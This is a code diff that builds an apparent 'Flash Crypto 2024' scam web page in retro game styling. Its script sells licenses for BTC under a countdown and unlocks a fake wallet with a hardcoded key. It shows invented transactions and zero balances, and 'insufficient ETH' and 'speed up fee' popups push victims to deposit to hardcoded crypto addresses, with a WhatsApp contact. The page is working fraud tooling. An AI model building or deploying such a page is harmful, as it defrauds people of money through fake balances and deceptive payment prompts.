@@ -2,9 +2,336 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Flash Crypto 2024 - Nintendo Style</title>
-    <link rel="stylesheet" href="styles.css">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap');
+
+        :root {
+            --primary-color: #00ffff;
+            --secondary-color: #ff00ff;
+            --text-color: #ffffff;
+            --background-color: #121212;
+            --card-background: #1e1e1e;
+        }
+
+        body, html {
+            margin: 0;
+            padding: 0;
+            font-family: 'Orbitron', sans-serif;
+            background-color: var(--background-color);
+            color: var(--text-color);
+            overflow-x: hidden;
+            image-rendering: pixelated;
+            font-size: 16px;
+        }
+
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(45deg, #121212 25%, transparent 25%, transparent 75%, #121212 75%, #121212),
+                        linear-gradient(45deg, #121212 25%, transparent 25%, transparent 75%, #121212 75%, #121212);
+            background-size: 60px 60px;
+            background-position: 0 0, 30px 30px;
+            z-index: -1;
+            opacity: 0.1;
+        }
+
+        .container {
+            max-width: 1200px;
+            width: 100%;
+            padding: 20px;
+            margin: 0 auto;
+            box-sizing: border-box;
+        }
+
+        .logo {
+            position: absolute;
+            top: 10px;
+            left: 10px;
+            width: 40px;
+            height: 40px;
+            z-index: 1;
+        }
+
+        h1, h2, h3 {
+            color: var(--primary-color);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-top: 10px;
+            margin-bottom: 10px;
+        }
+
+        h1 { font-size: 2em; }
+        h2 { font-size: 1.5em; }
+        h3 { font-size: 1.2em; }
+
+        .content, .plan, .coin, .popup {
+            background: rgba(30, 30, 30, 0.7);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 8px 32px 0 rgba(0, 255, 255, 0.1);
+            padding: 15px;
+            margin-top: 60px;
+        }
+
+        input[type="text"], select {
+            width: calc(100% - 24px);
+            padding: 10px;
+            margin: 5px 0;
+            border: 1px solid var(--primary-color);
+            background: rgba(30, 30, 30, 0.7);
+            color: var(--text-color);
+            font-family: 'Orbitron', sans-serif;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+
+        button {
+            background: linear-gradient(45deg, var(--primary-color), var(--secondary-color));
+            border: none;
+            color: var(--background-color);
+            font-weight: bold;
+            text-transform: uppercase;
+            padding: 10px 20px;
+            border-radius: 5px;
+            transition: all 0.3s ease;
+            box-shadow: 0 0 10px var(--primary-color);
+            min-height: 44px;
+            min-width: 44px;
+        }
+
+        button:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 0 20px var(--secondary-color);
+        }
+
+        .license-plans {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 20px;
+        }
+
+        .plan, .coin {
+            margin: 5px 0;
+            width: 100%;
+            text-align: center;
+            box-shadow: 4px 4px 0 rgba(69, 160, 73, 0.5);
+        }
+
+        .coin:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 10px 20px rgba(0, 255, 255, 0.2);
+        }
+
+        .popup {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            z-index: 1000;
+            max-width: 90%;
+            width: 400px;
+        }
+
+        table {
+            border-collapse: separate;
+            border-spacing: 0 10px;
+            width: 100%;
+            font-size: 0.9em;
+        }
+
+        th, td {
+            background: rgba(30, 30, 30, 0.7);
+            padding: 15px;
+            border: none;
+            border-top: 1px solid var(--primary-color);
+            border-bottom: 1px solid var(--primary-color);
+        }
+
+        th:first-child, td:first-child {
+            border-left: 1px solid var(--primary-color);
+            border-top-left-radius: 5px;
+            border-bottom-left-radius: 5px;
+        }
+
+        th:last-child, td:last-child {
+            border-right: 1px solid var(--primary-color);
+            border-top-right-radius: 5px;
+            border-bottom-right-radius: 5px;
+        }
+
+        ::-webkit-scrollbar {
+            width: 10px;
+        }
+
+        ::-webkit-scrollbar-track {
+            background: var(--background-color);
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: var(--primary-color);
+            border-radius: 5px;
+        }
+
+        ::-webkit-scrollbar-thumb:hover {
+            background: var(--secondary-color);
+        }
+
+        @keyframes rotateBorder {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        #walletPage {
+            padding: 10px;
+        }
+
+        .address {
+            word-break: break-all;
+            font-size: 0.8em;
+        }
+
+        .wallet {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            gap: 10px;
+        }
+
+        .coin {
+            width: 100%;
+        }
+
+        #notificationButton {
+            position: fixed;
+            top: 10px;
+            right: 10px;
+            background-color: var(--primary-color);
+            color: white;
+            border: none;
+            padding: 5px 10px;
+            cursor: pointer;
+            font-family: 'Orbitron', sans-serif;
+            font-size: 0.9em;
+        }
+
+        #notificationPopup {
+            position: fixed;
+            top: 50px;
+            right: 10px;
+            background-color: var(--card-background);
+            border: 2px solid var(--primary-color);
+            padding: 10px;
+            display: none;
+            z-index: 1000;
+            font-family: 'Orbitron', sans-serif;
+            font-size: 0.9em;
+        }
+
+        @media (max-width: 768px) {
+            body {
+                font-size: 14px;
+            }
+
+            .container {
+                padding: 10px;
+            }
+
+            .license-plans {
+                grid-template-columns: 1fr;
+            }
+
+            .wallet {
+                grid-template-columns: repeat(2, 1fr);
+            }
+
+            table {
+                font-size: 0.9em;
+            }
+
+            th, td {
+                padding: 10px;
+            }
+        }
+
+        @media (max-width: 480px) {
+            body {
+                font-size: 12px;
+            }
+
+            .wallet {
+                grid-template-columns: 1fr;
+            }
+
+            #notificationButton {
+                font-size: 0.8em;
+                padding: 3px 6px;
+            }
+        }
+
+        .logo::after {
+            content: '';
+            position: absolute;
+            top: -5px;
+            left: -5px;
+            right: -5px;
+            bottom: -5px;
+            border: 2px solid var(--primary-color);
+            border-radius: 50%;
+            animation: rotateBorder 10s linear infinite;
+        }
+
+        #walletPage {
+            padding: 10px;
+        }
+
+        .address {
+            word-break: break-all;
+            font-size: 0.8em;
+        }
+
+        .wallet {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: space-between;
+        }
+
+        .coin {
+            width: calc(50% - 5px);
+            margin-bottom: 10px;
+        }
+
+        #notificationButton {
+            position: fixed;
+            top: 10px;
+            right: 10px;
+            background-color: var(--primary-color);
+            color: white;
+            border: none;
+            padding: 5px 10px;
+            cursor: pointer;
+            font-family: 'Orbitron', sans-serif;
+            font-size: 0.9em;
+        }
+
+        #notificationPopup {
+            position: fixed;
+            top: 50px;
+            right: 10px;
+            background-color: var(--card-background);
+            border: 2px solid var(--primary-color);
+            padding: 10px;
+            display: none;
+            z-index: 1000;
+            font-family: 'Orbitron', sans-serif;
+            font-size: 0.9em;
+        }
+    </style>
 </head>
 <body>
     <div class="tetris-block" style="left: 10%; animation-delay: 0s;"></div>
@@ -178,6 +505,307 @@
         <p>Your ETH balance is insufficient to speed up the transaction. Minimum fee: 0.05 ETH</p>
     </div>
 
-    <script src="script.js"></script>
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            function showPopup(popup) {
+                popup.style.display = 'block';
+            }
+
+            function hidePopup(popup) {
+                popup.style.display = 'none';
+            }
+
+            const closeButtons = document.querySelectorAll('.close-popup');
+            closeButtons.forEach(button => {
+                button.addEventListener('click', () => {
+                    hidePopup(button.closest('.popup'));
+                });
+            });
+
+            const activateBtn = document.getElementById('activateBtn');
+            const licenseKeyInput = document.getElementById('licenseKey');
+            const activationCodeInput = document.getElementById('activationCode');
+            const invalidLicensePopup = document.getElementById('invalidLicensePopup');
+            const walletPage = document.getElementById('walletPage');
+            const container = document.querySelector('.container');
+
+            activateBtn.addEventListener('click', () => {
+                const licenseKey = licenseKeyInput.value;
+                const activationCode = activationCodeInput.value;
+
+                if (licenseKey === 'G56FT34' && activationCode === 'R539JY') {
+                    showNintendoLoadingAnimation();
+                    setTimeout(() => {
+                        container.style.display = 'none';
+                        walletPage.style.display = 'block';
+                        updateBalances();
+                    }, 3000);
+                } else {
+                    showPopup(invalidLicensePopup);
+                }
+            });
+
+            const purchaseButtons = document.querySelectorAll('.purchaseBtn');
+            const paymentPopup = document.getElementById('paymentPopup');
+            const btcAddressElement = document.getElementById('btcAddress');
+            const paymentAmountElement = document.getElementById('paymentAmount');
+            const copyBtcAddressBtn = document.getElementById('copyBtcAddress');
+            const countdownElement = document.getElementById('countdown');
+
+            purchaseButtons.forEach(button => {
+                button.addEventListener('click', () => {
+                    const plan = button.getAttribute('data-plan');
+                    let amount, btcAmount;
+
+                    switch (plan) {
+                        case 'elite':
+                            amount = '1,500 USD';
+                            btcAmount = '0.02447091 BTC';
+                            break;
+                        case 'lite':
+                            amount = '100 USD';
+                            btcAmount = '0.00163677 BTC';
+                            break;
+                        case 'enterprise':
+                            amount = '500 USD';
+                            btcAmount = '0.00818144 BTC';
+                            break;
+                    }
+
+                    paymentAmountElement.textContent = `${btcAmount} (${amount})`;
+                    showPopup(paymentPopup);
+                    startCountdown(35 * 60);
+                });
+            });
+
+            copyBtcAddressBtn.addEventListener('click', () => {
+                navigator.clipboard.writeText(btcAddressElement.textContent)
+                    .then(() => alert('BTC address copied to clipboard!'))
+                    .catch(err => console.error('Failed to copy: ', err));
+            });
+
+            function startCountdown(duration) {
+                let timer = duration, minutes, seconds;
+                const countdownInterval = setInterval(function () {
+                    minutes = parseInt(timer / 60, 10);
+                    seconds = parseInt(timer % 60, 10);
+
+                    minutes = minutes < 10 ? "0" + minutes : minutes;
+                    seconds = seconds < 10 ? "0" + seconds : seconds;
+
+                    countdownElement.textContent = minutes + ":" + seconds;
+
+                    if (--timer < 0) {
+                        clearInterval(countdownInterval);
+                        countdownElement.textContent = "Time's up!";
+                    }
+                }, 1000);
+            }
+
+            const contactButtons = document.querySelectorAll('.contactBtn');
+
+            contactButtons.forEach(button => {
+                button.addEventListener('click', () => {
+                    window.open('https://wa.me/447753831282', '_blank');
+                });
+            });
+
+            const loadBtn = document.getElementById('loadBtn');
+            const loadWalletPopup = document.getElementById('loadWalletPopup');
+            const coinSelect = document.getElementById('coinSelect');
+            const depositAddressElement = document.getElementById('depositAddress');
+            const copyDepositAddressBtn = document.getElementById('copyDepositAddress');
+
+            loadBtn.addEventListener('click', () => {
+                showPopup(loadWalletPopup);
+            });
+
+            coinSelect.addEventListener('change', () => {
+                const selectedCoin = coinSelect.value;
+                let address;
+
+                switch (selectedCoin) {
+                    case 'ETH':
+                    case 'BNB':
+                    case 'USDT':
+                        address = '0xB1B9a6Ea97EFBe291c241a18Ff89227cA428AFF9';
+                        break;
+                    case 'BTC':
+                        address = 'bc1qvyzw9wdtru8equvj64scy5nn5swqv8njenmhls';
+                        break;
+                    default:
+                        address = '';
+                }
+
+                depositAddressElement.textContent = address;
+            });
+
+            copyDepositAddressBtn.addEventListener('click', () => {
+                navigator.clipboard.writeText(depositAddressElement.textContent)
+                    .then(() => alert('Address copied to clipboard!'))
+                    .catch(err => console.error('Failed to copy: ', err));
+            });
+
+            const transferBtn = document.getElementById('transferBtn');
+            const transferPopup = document.getElementById('transferPopup');
+            const sendUsdtBtn = document.getElementById('sendUsdtBtn');
+            const insufficientEthPopup = document.getElementById('insufficientEthPopup');
+
+            transferBtn.addEventListener('click', () => {
+                showPopup(transferPopup);
+            });
+
+            sendUsdtBtn.addEventListener('click', () => {
+                const ethBalance = parseFloat(document.getElementById('ethBalance').textContent);
+                if (ethBalance < 0.001) {
+                    showPopup(insufficientEthPopup);
+                } else {
+                    alert('USDT transfer initiated!');
+                    hidePopup(transferPopup);
+                }
+            });
+
+            const transactionHistory = document.getElementById('transactionHistory');
+            const transactions = [
+                { date: '2023-06-01 10:30', value: '$1,250.00', status: 'Pending', details: 'ETH Transfer to 0x7a9f...3d2c' },
+                { date: '2023-06-02 14:15', value: '$3,750.00', status: 'Completed', details: 'BTC Withdrawal to 1BvBM...NJG4' },
+                { date: '2023-06-03 09:45', value: '$500.00', status: 'Pending', details: 'USDT Deposit from 0x8f3c...9a1b' },
+                { date: '2023-06-04 16:20', value: '$2,100.00', status: 'Failed', details: 'BNB Swap to ETH' },
+                { date: '2023-06-05 11:55', value: '$890.00', status: 'Completed', details: 'ETH Purchase from Coinbase' }
+            ];
+
+            function updateTransactionHistory() {
+                transactionHistory.innerHTML = '';
+                transactions.forEach(transaction => {
+                    const row = document.createElement('tr');
+                    row.innerHTML = `
+                        <td>${transaction.date}</td>
+                        <td>${transaction.value}</td>
+                        <td>${transaction.status}</td>
+                        <td>${transaction.details}</td>
+                    `;
+                    transactionHistory.appendChild(row);
+                });
+            }
+
+            updateTransactionHistory();
+
+            const speedUpBtn = document.getElementById('speedUpBtn');
+            const speedUpPopup = document.getElementById('speedUpPopup');
+            const confirmSpeedUpBtn = document.getElementById('confirmSpeedUpBtn');
+            const insufficientEthSpeedUpPopup = document.getElementById('insufficientEthSpeedUpPopup');
+
+            speedUpBtn.addEventListener('click', () => {
+                showPopup(speedUpPopup);
+            });
+
+            confirmSpeedUpBtn.addEventListener('click', () => {
+                const ethBalance = parseFloat(document.getElementById('ethBalance').textContent);
+                if (ethBalance < 0.05) {
+                    showPopup(insufficientEthSpeedUpPopup);
+                } else {
+                    alert('Transactions speed up initiated!');
+                    hidePopup(speedUpPopup);
+                }
+            });
+
+            const copyButtons = document.querySelectorAll('.copy-btn');
+            copyButtons.forEach(button => {
+                button.addEventListener('click', () => {
+                    const address = button.getAttribute('data-address');
+                    navigator.clipboard.writeText(address)
+                        .then(() => alert('Address copied to clipboard!'))
+                        .catch(err => console.error('Failed to copy: ', err));
+                });
+            });
+
+            function showNintendoLoadingAnimation() {
+                const loadingAnimation = document.createElement('div');
+                loadingAnimation.style.position = 'fixed';
+                loadingAnimation.style.top = '0';
+                loadingAnimation.style.left = '0';
+                loadingAnimation.style.width = '100%';
+                loadingAnimation.style.height = '100%';
+                loadingAnimation.style.backgroundColor = 'var(--background-color)';
+                loadingAnimation.style.display = 'flex';
+                loadingAnimation.style.justifyContent = 'center';
+                loadingAnimation.style.alignItems = 'center';
+                loadingAnimation.style.zIndex = '9999';
+
+                const mario = document.createElement('div');
+                mario.style.width = '32px';
+                mario.style.height = '32px';
+                mario.style.backgroundColor = 'var(--primary-color)';
+                mario.style.borderRadius = '50%';
+                mario.style.animation = 'marioRun 1s steps(4) infinite';
+
+                loadingAnimation.appendChild(mario);
+                document.body.appendChild(loadingAnimation);
+
+                const style = document.createElement('style');
+                style.textContent = `
+                    @keyframes marioRun {
+                        0% { transform: translateX(-50px); }
+                        100% { transform: translateX(50px); }
+                    }
+                `;
+                document.head.appendChild(style);
+
+                setTimeout(() => {
+                    document.body.removeChild(loadingAnimation);
+                }, 3000);
+            }
+
+            const buttons = document.querySelectorAll('button');
+            buttons.forEach(button => {
+                button.addEventListener('mouseover', () => {
+                    button.style.transform = 'scale(1.1)';
+                    button.style.transition = 'transform 0.1s steps(5)';
+                });
+                button.addEventListener('mouseout', () => {
+                    button.style.transform = 'scale(1)';
+                });
+            });
+
+            const coinSound = new Audio('https://www.soundjay.com/misc/sounds/coin-01.mp3');
+            buttons.forEach(button => {
+                button.addEventListener('click', () => {
+                    coinSound.play();
+                });
+            });
+
+            function updateBalances() {
+                document.getElementById('ethBalance').textContent = '0.0000';
+                document.getElementById('bnbBalance').textContent = '0.0000';
+                document.getElementById('btcBalance').textContent = '0.0000';
+            }
+
+            const notificationButton = document.getElementById('notificationButton');
+            const notificationPopup = document.getElementById('notificationPopup');
+
+            notificationButton.addEventListener('click', () => {
+                if (notificationPopup.style.display === 'none') {
+                    showPopup(notificationPopup);
+                } else {
+                    hidePopup(notificationPopup);
+                }
+            });
+
+            updateTransactionHistory();
+            window.dispatchEvent(new Event('resize'));
+        });
+
+        window.addEventListener('resize', function() {
+            if (window.innerWidth <= 768) {
+                document.querySelectorAll('.plan').forEach(plan => {
+                    plan.style.marginBottom = '20px';
+                });
+            } else {
+                document.querySelectorAll('.plan').forEach(plan => {
+                    plan.style.marginBottom = '0';
+                });
+            }
+        });
+    </script>
 </body>
 </html>
